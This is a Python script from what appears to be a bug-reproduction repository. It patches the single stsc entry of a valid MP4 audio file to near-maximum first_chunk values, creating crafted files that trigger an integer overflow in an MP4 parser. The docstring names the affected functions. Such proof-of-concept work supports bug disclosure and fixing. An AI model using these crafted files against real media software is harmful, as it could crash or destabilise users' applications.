#!/usr/bin/env python3
"""Regenerate this repro's crafted assets from assets/base.m4a (provenance only - the crafted
files are already committed in assets/, so running this is not required to reproduce the bug).

assets/base.m4a is a real, valid, unmodified AAC-in-MP4 file produced by:

    ffmpeg -f lavfi -i "sine=frequency=440:duration=0.5" -c:a aac -b:a 64k base.m4a

Its stbl tables are:
  stts: [{sample_count: 22, sample_delta: 1024}, {sample_count: 1, sample_delta: 546}]
  stsc: [{first_chunk: 1, samples_per_chunk: 23, sample_desc_index: 1}]   (exactly 1 entry)
  stsz: sample_count = 23, variable sizes
  stco: 1 chunk offset

This script binary-patches the single stsc entry in place (no box size changes, so the file stays
structurally valid) to:
  evil_stsc.mp4    -> {first_chunk: 0xFFFFFFFF, samples_per_chunk: 1}
  evil_stsc_v2.mp4 -> {first_chunk: 0xFFFFFFFE, samples_per_chunk: 1}

`StscAtom::read` stores `first_chunk_raw - 1`, so those become 0xFFFFFFFE / 0xFFFFFFFD internally.
Nothing ever bounds that value against the stco/co64 chunk count, so
`MoovSegment::sample_data`'s `group.first_chunk + chunk_in_group` overflows u32 once
`chunk_in_group` (== sample index, with samples_per_chunk == 1) gets large enough.

Usage: python3 craft_assets.py
"""
import struct
import sys

CONTAINERS = {b"moov", b"trak", b"mdia", b"minf", b"stbl", b"edts", b"dinf", b"udta"}


def find_box(buf, off, end, want):
    """Return (payload_offset, box_end) of the first `want` box, searching containers depth-first."""
    while off + 8 <= end:
        (size,) = struct.unpack(">I", buf[off : off + 4])
        typ = bytes(buf[off + 4 : off + 8])
        hs = 8
        if size == 1:
            (size,) = struct.unpack(">Q", buf[off + 8 : off + 16])
            hs = 16
        elif size == 0:
            size = end - off
        if size < hs:
            raise ValueError(f"bad box size {size} at {off}")
        if typ == want:
            return off + hs, off + size
        if typ in CONTAINERS:
            found = find_box(buf, off + hs, off + size, want)
            if found:
                return found
        off += size
    return None


def patch(src, dst, first_chunk, samples_per_chunk):
    buf = bytearray(open(src, "rb").read())

    payload, _ = find_box(buf, 0, len(buf), b"stsc")
    (entry_count,) = struct.unpack(">I", buf[payload + 4 : payload + 8])
    if entry_count != 1:
        raise SystemExit(f"expected exactly 1 stsc entry in {src}, got {entry_count}")

    old = struct.unpack(">III", buf[payload + 8 : payload + 20])
    struct.pack_into(">III", buf, payload + 8, first_chunk, samples_per_chunk, old[2])

    stsz_payload, _ = find_box(buf, 0, len(buf), b"stsz")
    (sample_count,) = struct.unpack(">I", buf[stsz_payload + 8 : stsz_payload + 12])
    stco_payload, _ = find_box(buf, 0, len(buf), b"stco")
    (chunk_count,) = struct.unpack(">I", buf[stco_payload + 4 : stco_payload + 8])

    open(dst, "wb").write(bytes(buf))
    print(
        f"{dst}: stsc entry {old} -> "
        f"(0x{first_chunk:08X}, {samples_per_chunk}, {old[2]}); "
        f"stsz sample_count={sample_count}, stco entry_count={chunk_count}"
    )


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "assets/base.m4a"
    patch(base, "assets/evil_stsc.mp4", 0xFFFFFFFF, 1)
    patch(base, "assets/evil_stsc_v2.mp4", 0xFFFFFFFE, 1)
